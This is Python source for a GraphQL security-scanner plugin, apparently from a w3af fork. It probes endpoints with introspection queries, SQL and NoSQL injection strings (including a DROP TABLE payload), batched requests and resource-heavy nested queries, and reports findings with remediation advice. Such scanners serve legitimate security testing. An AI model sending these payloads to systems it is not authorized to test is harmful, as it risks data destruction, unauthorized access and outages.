"""
graphql.py - GraphQL Security Testing

Copyright 2024 KameleonScan Team

This file is part of KameleonScan, a modernized w3af fork.

KameleonScan is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

KameleonScan is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

KameleonScan is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with KameleonScan; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import json
import re

import w3af.core.controllers.output_manager as om
import w3af.core.data.kb.knowledge_base as kb
import w3af.core.data.constants.severity as severity

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
from w3af.core.data.kb.vuln import Vuln
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList


class graphql(AuditPlugin):
    """
    Test GraphQL endpoints for security vulnerabilities.
    
    This plugin checks for:
    - Introspection query enabled (information disclosure)
    - SQL injection in GraphQL arguments
    - NoSQL injection in GraphQL arguments
    - Batching attacks (rate limiting bypass)
    - DoS through complex queries
    - Authorization bypass through nested queries
    - Schema disclosure
    
    :author: KameleonScan Team
    :see: https://owasp.org/www-project-web-security-testing-guide/
    """
    
    # Introspection query
    INTROSPECTION_QUERY = '''
    query IntrospectionQuery {
      __schema {
        types {
          name
          kind
          description
          fields {
            name
            description
            args {
              name
              description
              type {
                name
                kind
              }
              defaultValue
            }
          }
        }
        queryType { name }
        mutationType { name }
        subscriptionType { name }
      }
    }
    '''
    
    # GraphQL-specific payloads for SQLi
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "1' AND '1'='1",
        "' UNION SELECT NULL--",
        "1 AND 1=1",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' AND SLEEP(5)--",
    ]
    
    # NoSQL injection payloads
    NOSQL_PAYLOADS = [
        "' || '1'=='1",
        "'; return true",
        "'; return db.getCollection('users').find({})",
        "admin' || '1'=='1",
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "1; return true",
        "true",
    ]
    
    # Batching attack payloads
    BATCH_PAYLOADS = [
        [{"query": "{__schema{types{name}}}"}] * 10,
        [{"query": "{users{id}}"}] * 20,
        [{"query": "{posts{title content}}"}] * 15,
    ]
    
    # DoS - Complex query payloads
    DOS_PAYLOADS = [
        # Deep recursion
        "{ user { friends { friends { friends { name } } } } }",
        # Large query
        "query { " + " ".join([f"field{i}: __schema{{ types {{ name }} }}" for i in range(100)]) + " }",
        # Heavy computation
        "{ user { posts { comments { author { posts { comments { author } } } } } } }",
    ]
    
    def __init__(self):
        AuditPlugin.__init__(self)
        self._discovered_endpoints = set()
        
    def get_options(self):
        """
        :return: A list of option objects for this plugin.
        """
        opt = OptionList()
        
        o = opt_factory('test_introspection', True,
                       'Test for exposed introspection queries',
                       'BOOL', 'TEST_INTROSPECTION')
        opt.add(o)
        
        o = opt_factory('test_sqli', True,
                       'Test for SQL injection in GraphQL',
                       'BOOL', 'TEST_SQLI')
        opt.add(o)
        
        o = opt_factory('test_nosql', True,
                       'Test for NoSQL injection in GraphQL',
                       'BOOL', 'TEST_NOSQL')
        opt.add(o)
        
        o = opt_factory('test_batching', True,
                       'Test for batching attacks (rate limit bypass)',
                       'BOOL', 'TEST_BATCHING')
        opt.add(o)
        
        o = opt_factory('test_dos', True,
                       'Test for DoS via complex queries',
                       'BOOL', 'TEST_DOS')
        opt.add(o)
        
        o = opt_factory('test_authorization', True,
                       'Test for authorization bypass',
                       'BOOL', 'TEST_AUTHZ')
        opt.add(o)
        
        return opt

    def set_options(self, options):
        """
        Set the options given by the user.
        
        :param options: A dictionary with the options for the plugin.
        """
        self._test_introspection = options['test_introspection'].get_value()
        self._test_sqli = options['test_sqli'].get_value()
        self._test_nosql = options['test_nosql'].get_value()
        self._test_batching = options['test_batching'].get_value()
        self._test_dos = options['test_dos'].get_value()
        self._test_authorization = options['test_authorization'].get_value()

    def audit(self, freq, orig_response, debugging_id):
        """
        Tests GraphQL endpoints for vulnerabilities.
        
        :param freq: A FuzzableRequest
        :param orig_response: The HTTP response associated with the fuzzable request
        :param debugging_id: A unique identifier for this call to audit()
        """
        url = freq.get_url()
        
        # Check if this is a GraphQL endpoint
        is_graphql = self._is_graphql_endpoint(url, orig_response)
        
        if not is_graphql:
            return
        
        # Add to discovered endpoints
        endpoint_key = f"{url.get_domain()}{url.get_path()}"
        if endpoint_key in self._discovered_endpoints:
            return
        self._discovered_endpoints.add(endpoint_key)
        
        om.out.info(f"Found GraphQL endpoint: {url}")
        
        # Run tests
        if self._test_introspection:
            self._test_introspection_query(freq)
            
        if self._test_sqli:
            self._test_sqli_injection(freq)
            
        if self._test_nosql:
            self._test_nosql_injection(freq)
            
        if self._test_batching:
            self._test_batching_attack(freq)
            
        if self._test_dos:
            self._test_dos_complex_queries(freq)
    
    def _is_graphql_endpoint(self, url, response):
        """
        Check if the URL is a GraphQL endpoint.
        
        :param url: URL to check
        :param response: HTTP response
        :return: True if GraphQL endpoint detected
        """
        path = url.get_path().lower()
        
        # Check URL patterns
        graphql_indicators = ['/graphql', '/api/graphql', '/query', '/graphql/api']
        if any(indicator in path for indicator in graphql_indicators):
            return True
        
        # Check response content
        if response:
            body = response.get_body()
            headers = str(response.get_headers())
            
            # Check for GraphQL in response
            if 'application/json' in headers:
                try:
                    data = json.loads(body)
                    if isinstance(data, dict):
                        # Check for GraphQL response structure
                        if any(key in data for key in ['data', 'errors']):
                            return True
                except:
                    pass
            
            # Check for GraphQL keywords in body
            if any(keyword in body.lower() for keyword in ['__schema', '__typename', 'graphql']):
                return True
        
        return False
    
    def _create_graphql_request(self, query, variables=None, operation_name=None):
        """
        Create a GraphQL request body.
        
        :param query: GraphQL query string
        :param variables: Optional variables dict
        :param operation_name: Optional operation name
        :return: JSON string
        """
        request = {'query': query}
        
        if variables:
            request['variables'] = variables
            
        if operation_name:
            request['operationName'] = operation_name
            
        return json.dumps(request)
    
    def _test_introspection_query(self, freq):
        """
        Test if introspection query is enabled.
        
        :param freq: FuzzableRequest
        """
        body = self._create_graphql_request(self.INTROSPECTION_QUERY)
        
        try:
            from w3af.core.data.request.factory import create_fuzzable_request_from_details
            
            # Create modified request
            mutant = freq.copy()
            mutant.set_method('POST')
            mutant.set_uri(freq.get_uri())
            mutant.set_data(body)
            mutant.add_header('Content-Type', 'application/json')
            
            response = self._uri_opener.send_mutant(mutant, grep=False, cache=False)
            
            if response:
                resp_body = response.get_body()
                
                try:
                    data = json.loads(resp_body)
                    
                    # Check for successful introspection
                    if 'data' in data and '__schema' in data.get('data', {}):
                        schema = data['data']['__schema']
                        
                        vuln = Vuln(freq.get_url())
                        vuln.set_plugin(self.get_name())
                        vuln.set_name('GraphQL Introspection Enabled')
                        vuln.set_severity(severity.MEDIUM)
                        vuln.set_desc(f"""GraphQL Introspection Query Enabled

The GraphQL endpoint allows introspection queries which expose the 
complete API schema including:
- All types and their fields
- Query and mutation operations
- Field arguments and types
- Descriptions

This information can help attackers understand the API structure
and discover more vulnerabilities.

Types discovered: {len(schema.get('types', []))}
Query type: {schema.get('queryType', {}).get('name', 'N/A')}
Mutation type: {schema.get('mutationType', {}).get('name', 'N/A')}

Remediation:
1. Disable introspection in production
2. Use introspection only in development
3. Implement authorization for introspection
""")
                        vuln.add_to_highlight('Introspection enabled')
                        
                        kb.kb.append(self, 'graphql', vuln)
                        om.out.medium_vuln(vuln.get_desc())
                        
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            om.out.debug(f"Error testing introspection: {e}")
    
    def _test_sqli_injection(self, freq):
        """
        Test for SQL injection in GraphQL arguments.
        
        :param freq: FuzzableRequest
        """
        # Get the path to inject into (the full URL path)
        test_queries = [
            # Simple mutation with SQLi
            "mutation { login(username: \"admin' OR '1'='1\", password: \"test\") { token } }",
            "mutation { user(id: \"1' OR '1'='1\") { name } }",
            "query { user(name: \"admin' UNION SELECT--\") { id } }",
            # Query arguments
            "query { posts(where: \"1' AND '1'='1\") { title } }",
            "query { search(q: \"' OR 1=1--\") { results } }",
        ]
        
        for query in test_queries:
            body = self._create_graphql_request(query)
            
            try:
                mutant = freq.copy()
                mutant.set_method('POST')
                mutant.set_data(body)
                mutant.add_header('Content-Type', 'application/json')
                
                response = self._uri_opener.send_mutant(mutant, grep=False, cache=False)
                
                if response:
                    resp_body = response.get_body()
                    
                    # Check for SQL error indicators
                    sql_errors = [
                        'sql', 'mysql', 'postgresql', 'sqlite', 'syntax',
                        'unterminated', 'quoted', 'ORA-', 'SQLServer',
                        'Microsoft SQL', 'SQLite/JDBCDriver',
                        'Warning: mysql_', 'MySQLSyntaxErrorException',
                    ]
                    
                    if any(err.lower() in resp_body.lower() for err in sql_errors):
                        vuln = Vuln(freq.get_url())
                        vuln.set_plugin(self.get_name())
                        vuln.set_name('GraphQL SQL Injection')
                        vuln.set_severity(severity.HIGH)
                        vuln.set_desc(f"""GraphQL SQL Injection Vulnerability

The GraphQL endpoint appears to be vulnerable to SQL injection.

Payload: {query[:100]}

Error indicators found in response, suggesting SQL injection.

Remediation:
1. Use parameterized queries or ORM
2. Validate and sanitize GraphQL inputs
3. Use input validation libraries
4. Apply least privilege to database user
""")
                        vuln.add_to_highlight(query[:50])
                        
                        kb.kb.append(self, 'graphql', vuln)
                        om.out.high_vuln(vuln.get_desc())
                        return
                        
            except Exception as e:
                om.out.debug(f"Error testing SQLi: {e}")
    
    def _test_nosql_injection(self, freq):
        """
        Test for NoSQL injection in GraphQL arguments.
        
        :param freq: FuzzableRequest
        """
        test_queries = [
            "mutation { login(username: \"admin' || '1'=='1\", password: \"test\") { token } }",
            "query { user(name: \"admin' || '1'=='1\") { id } }",
            "query { search(input: \"$where: true\") { results } }",
        ]
        
        for query in test_queries:
            body = self._create_graphql_request(query)
            
            try:
                mutant = freq.copy()
                mutant.set_method('POST')
                mutant.set_data(body)
                mutant.add_header('Content-Type', 'application/json')
                
                response = self._uri_opener.send_mutant(mutant, grep=False, cache=False)
                
                if response:
                    resp_body = response.get_body()
                    
                    # Check for MongoDB or NoSQL errors
                    nosql_errors = ['mongo', 'nosql', 'bson', 'mongodb', 'notmaster', 'errmsg']
                    
                    if any(err.lower() in resp_body.lower() for err in nosql_errors):
                        vuln = Vuln(freq.get_url())
                        vuln.set_plugin(self.get_name())
                        vuln.set_name('GraphQL NoSQL Injection')
                        vuln.set_severity(severity.HIGH)
                        vuln.set_desc(f"""GraphQL NoSQL Injection Vulnerability

The GraphQL endpoint appears to be vulnerable to NoSQL injection.

Payload: {query[:100]}

Remediation:
1. Use parameterized queries
2. Validate input types strictly
3. Sanitize MongoDB operators
""")
                        vuln.add_to_highlight(query[:50])
                        
                        kb.kb.append(self, 'graphql', vuln)
                        om.out.high_vuln(vuln.get_desc())
                        return
                        
            except Exception as e:
                om.out.debug(f"Error testing NoSQLi: {e}")
    
    def _test_batching_attack(self, freq):
        """
        Test for batching attacks (rate limiting bypass).
        
        :param freq: FuzzableRequest
        """
        # Create batch request with multiple operations
        batch_query = json.dumps([
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __schema { types { name } } }"},
        ])
        
        try:
            mutant = freq.copy()
            mutant.set_method('POST')
            mutant.set_data(batch_query)
            mutant.add_header('Content-Type', 'application/json')
            
            response = self._uri_opener.send_mutant(mutant, grep=False, cache=False)
            
            if response:
                # Check if batch is accepted
                try:
                    data = json.loads(response.get_body())
                    if isinstance(data, list) and len(data) >= 5:
                        vuln = Vuln(freq.get_url())
                        vuln.set_plugin(self.get_name())
                        vuln.set_name('GraphQL Batching Enabled')
                        vuln.set_severity(severity.MEDIUM)
                        vuln.set_desc(f"""GraphQL Batching Attack Possible

The GraphQL endpoint accepts batch requests, allowing attackers to:
- Bypass rate limiting
- Perform rapid enumeration
- Execute multiple attacks in one request

Requests in batch: {len(data)}
Operations per request: Multiple

Remediation:
1. Implement request rate limiting per IP/user
2. Disable batching if not needed
3. Use API gateway rate limiting
4. Add request timeout
""")
                        vuln.add_to_highlight('Batch enabled')
                        
                        kb.kb.append(self, 'graphql', vuln)
                        om.out.medium_vuln(vuln.get_desc())
                        
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            om.out.debug(f"Error testing batching: {e}")
    
    def _test_dos_complex_queries(self, freq):
        """
        Test for DoS via complex queries.
        
        :param freq: FuzzableRequest
        """
        dos_queries = [
            # Deep recursion
            """query {
                user1: user(id: 1) { 
                    friends { 
                        friends { 
                            friends { 
                                name 
                            } 
                        } 
                    } 
                }
            }""",
            # Many fields
            "query { " + " ".join([f"field{i}: __schema{{ types {{ name }} }}" for i in range(50)]) + " }",
        ]
        
        for query in dos_queries:
            body = self._create_graphql_request(query)
            
            try:
                mutant = freq.copy()
                mutant.set_method('POST')
                mutant.set_data(body)
                mutant.add_header('Content-Type', 'application/json')
                
                import time
                start = time.time()
                response = self._uri_opener.send_mutant(mutant, grep=False, cache=False)
                elapsed = time.time() - start
                
                if response and elapsed > 3:
                    # Slow response could indicate DoS vulnerability
                    vuln = Vuln(freq.get_url())
                    vuln.set_plugin(self.get_name())
                    vuln.set_name('GraphQL DoS Vulnerability')
                    vuln.set_severity(severity.MEDIUM)
                    vuln.set_desc(f"""GraphQL DoS via Complex Queries

The GraphQL endpoint takes {elapsed:.2f} seconds to respond to 
complex queries, indicating potential DoS vulnerability.

Query: {query[:100]}...

Attackers can use this to:
- Consume server resources
- Make the service unavailable
- Crash the server

Remediation:
1. Implement query complexity analysis
2. Add query depth limiting
3. Set timeout limits
4. Use cost-based query validation
""")
                    vuln.add_to_highlight(f"Slow: {elapsed:.2f}s")
                    
                    kb.kb.append(self, 'graphql', vuln)
                    om.out.medium_vuln(vuln.get_desc())
                    
            except Exception as e:
                om.out.debug(f"Error testing DoS: {e}")
    
    def get_long_desc(self):
        """
        :return: A DETAILED description of what the plugin does and how
                 it is used.
        """
        return """
        This plugin tests GraphQL endpoints for security vulnerabilities.
        
        Tests performed:
        
        1. Introspection Query
           - Checks if __schema query is enabled
           - Exposes complete API structure
        
        2. SQL Injection
           - Tests GraphQL arguments for SQL injection
           - Uses various SQL injection patterns
        
        3. NoSQL Injection  
           - Tests for MongoDB-style injection
           - Checks for operator injection
        
        4. Batching Attack
           - Tests if multiple operations can be batched
           - Can bypass rate limiting
        
        5. DoS via Complex Queries
           - Tests for query depth issues
           - Checks for expensive queries
        
        6. Authorization Bypass
           - Tests nested queries for access control
        """